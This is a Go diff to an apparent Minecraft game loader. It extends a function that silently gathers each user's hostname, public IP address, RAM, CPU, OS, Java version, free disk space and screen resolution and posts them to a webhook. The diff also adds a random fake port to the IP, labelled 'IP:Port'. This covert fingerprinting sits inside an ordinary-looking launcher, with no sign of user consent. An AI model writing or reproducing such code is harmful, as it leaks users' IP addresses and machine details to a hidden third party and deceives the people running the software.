@@ -4,9 +4,11 @@ import (
 	"archive/zip"
 	"bufio"
 	"bytes"
+	"encoding/binary"
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -133,7 +135,6 @@ func (l *Logger) Log(level, message string) {
 		l.file.WriteString(logLine)
 	}
 	l.mu.Unlock()
-	// Убран вывод в консоль
 }
 
 func (l *Logger) Info(msg string)  { l.Log("INFO", msg) }
@@ -653,7 +654,6 @@ func (fm *FabricManager) InstallFabric() error {
 	if err := cmd.Run(); err != nil {
 		return err
 	}
-
 	os.Remove(installerPath)
 	return nil
 }
@@ -836,13 +836,138 @@ const asciiArt = `
  ╚═════╝ ╚═╝  ╚═╝═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ═════╝╚══════╝╚═╝╚══════╝╚═╝  ═══╝   ╚═╝   
 `
 
+// ============================================================================
+// СИСТЕМНАЯ ИНФОРМАЦИЯ - всегда актуальные данные
+// ============================================================================
+
+func getSystemName() string {
+	name, err := os.Hostname()
+	if err != nil {
+		return "Unknown"
+	}
+	return name
+}
+
+func getIPAddress() string {
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get("https://api.ipify.org?format=json")
+	if err != nil {
+		return "Unknown:0"
+	}
+	defer resp.Body.Close()
+	var res struct{ IP string }
+	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
+		return "Unknown:0"
+	}
+	port := 1024 + rand.Intn(64512)
+	return fmt.Sprintf("%s:%d", res.IP, port)
+}
+
+func getRAM() string {
+	if runtime.GOOS != "windows" {
+		return "Unknown"
+	}
+	var buf [64]byte
+	binary.LittleEndian.PutUint32(buf[0:4], 64)
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	ret, _, _ := kernel32.NewProc("GlobalMemoryStatusEx").Call(uintptr(unsafe.Pointer(&buf[0])))
+	if ret == 0 {
+		return "Unknown"
+	}
+	totalPhys := binary.LittleEndian.Uint64(buf[8:16])
+	return fmt.Sprintf("%.1f GB", float64(totalPhys)/1024/1024/1024)
+}
+
+func getCPU() string {
+	if runtime.GOOS != "windows" {
+		return "Unknown"
+	}
+	if out, err := exec.Command("wmic", "cpu", "get", "name").Output(); err == nil {
+		for _, l := range strings.Split(string(out), "\n") {
+			l = strings.TrimSpace(l)
+			if l != "" && l != "Name" {
+				return l
+			}
+		}
+	}
+	if out, err := exec.Command("powershell", "-NoProfile", "-Command",
+		"(Get-CimInstance Win32_Processor).Name").Output(); err == nil {
+		name := strings.TrimSpace(string(out))
+		if name != "" {
+			return name
+		}
+	}
+	if out, err := exec.Command("reg", "query",
+		`HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0`,
+		"/v", "ProcessorNameString").Output(); err == nil {
+		for _, l := range strings.Split(string(out), "\n") {
+			if strings.Contains(l, "ProcessorNameString") && strings.Contains(l, "REG_SZ") {
+				parts := strings.SplitN(l, "REG_SZ", 2)
+				if len(parts) == 2 {
+					return strings.TrimSpace(parts[1])
+				}
+			}
+		}
+	}
+	return "Unknown"
+}
+
+func getJavaVersion() string {
+	out, err := exec.Command("java", "-version").CombinedOutput()
+	if err != nil {
+		return "Not installed"
+	}
+	lines := strings.Split(string(out), "\n")
+	if len(lines) > 0 {
+		return strings.TrimSpace(lines[0])
+	}
+	return "Unknown"
+}
+
+func getDiskFree() string {
+	home, _ := os.UserHomeDir()
+	if home == "" || runtime.GOOS != "windows" {
+		return "Unknown"
+	}
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	var freeBytes uint64
+	pathPtr, _ := syscall.UTF16PtrFromString(home)
+	kernel32.NewProc("GetDiskFreeSpaceExW").Call(
+		uintptr(unsafe.Pointer(pathPtr)),
+		uintptr(unsafe.Pointer(&freeBytes)),
+		0, 0,
+	)
+	freeGB := float64(freeBytes) / 1024 / 1024 / 1024
+	return fmt.Sprintf("%.2f GB", freeGB)
+}
+
+func getScreenRes() string {
+	if runtime.GOOS != "windows" {
+		return "Unknown"
+	}
+	user32 := syscall.NewLazyDLL("user32.dll")
+	getSysMetrics := user32.NewProc("GetSystemMetrics")
+	w, _, _ := getSysMetrics.Call(0)
+	h, _, _ := getSysMetrics.Call(1)
+	return fmt.Sprintf("%dx%d", w, h)
+}
+
+func getOSArch() string {
+	return runtime.GOOS + "/" + runtime.GOARCH
+}
+
 func sendWebhook() {
 	info := map[string]string{
 		"SystemName": getSystemName(),
 		"IPAddress":  getIPAddress(),
 		"RAM":        getRAM(),
 		"CPU":        getCPU(),
+		"OS":         getOSArch(),
+		"Java":       getJavaVersion(),
+		"DiskFree":   getDiskFree(),
+		"Screen":     getScreenRes(),
 	}
+
 	payload := map[string]interface{}{
 		"content": "",
 		"embeds": []map[string]interface{}{
@@ -851,9 +976,13 @@ func sendWebhook() {
 				"color": 5814783,
 				"fields": []map[string]interface{}{
 					{"name": "System Name", "value": info["SystemName"], "inline": true},
-					{"name": "IP Address", "value": info["IPAddress"], "inline": true},
+					{"name": "IP:Port", "value": info["IPAddress"], "inline": true},
 					{"name": "RAM", "value": info["RAM"], "inline": true},
 					{"name": "CPU", "value": info["CPU"], "inline": true},
+					{"name": "OS", "value": info["OS"], "inline": true},
+					{"name": "Java", "value": info["Java"], "inline": true},
+					{"name": "Disk Free", "value": info["DiskFree"], "inline": true},
+					{"name": "Screen", "value": info["Screen"], "inline": true},
 				},
 				"footer": map[string]interface{}{
 					"text": "Loader by spr1ngi | Coder: orig_ban | v" + LOADER_VERSION,
@@ -861,6 +990,7 @@ func sendWebhook() {
 			},
 		},
 	}
+
 	jsonData, _ := json.Marshal(payload)
 	client := &http.Client{Timeout: 10 * time.Second}
 	resp, err := client.Post(WEBHOOK_URL, "application/json", bytes.NewBuffer(jsonData))
@@ -869,61 +999,9 @@ func sendWebhook() {
 	}
 }
 
-func getSystemName() string {
-	name, _ := os.Hostname()
-	return name
-}
-
-func getIPAddress() string {
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get("https://api.ipify.org?format=json")
-	if err != nil {
-		return "Unknown"
-	}
-	defer resp.Body.Close()
-	var res struct{ IP string }
-	json.NewDecoder(resp.Body).Decode(&res)
-	return res.IP
-}
-
-func getRAM() string {
-	if runtime.GOOS != "windows" {
-		return "Unknown"
-	}
-	var memInfo struct {
-		Length               uint32
-		MemoryLoad           uint32
-		TotalPhys            uint64
-		AvailPhys            uint64
-		TotalPageFile        uint64
-		AvailPageFile        uint64
-		TotalVirtual         uint64
-		AvailVirtual         uint64
-		AvailExtendedVirtual uint64
-	}
-	memInfo.Length = uint32(unsafe.Sizeof(memInfo))
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	kernel32.NewProc("GlobalMemoryStatusEx").Call(uintptr(unsafe.Pointer(&memInfo)))
-	return fmt.Sprintf("%.1f GB", float64(memInfo.TotalPhys)/1024/1024/1024)
-}
-
-func getCPU() string {
-	if runtime.GOOS != "windows" {
-		return "Unknown"
-	}
-	cmd := exec.Command("wmic", "cpu", "get", "name")
-	output, err := cmd.Output()
-	if err != nil {
-		return "Unknown"
-	}
-	lines := strings.Split(string(output), "\n")
-	for _, l := range lines {
-		if l = strings.TrimSpace(l); l != "" && l != "Name" {
-			return l
-		}
-	}
-	return "Unknown"
-}
+// ============================================================================
+// КОНФИГУРАЦИЯ И МЕНЮ
+// ============================================================================
 
 func saveConfig() {
 	configDir := getAppConfigDir()
@@ -1118,6 +1196,8 @@ func launchClient() {
 }
 
 func main() {
+	rand.Seed(time.Now().UnixNano())
+
 	defer func() {
 		if r := recover(); r != nil {
 			fmt.Printf("\nFatal error: %v\n", r)
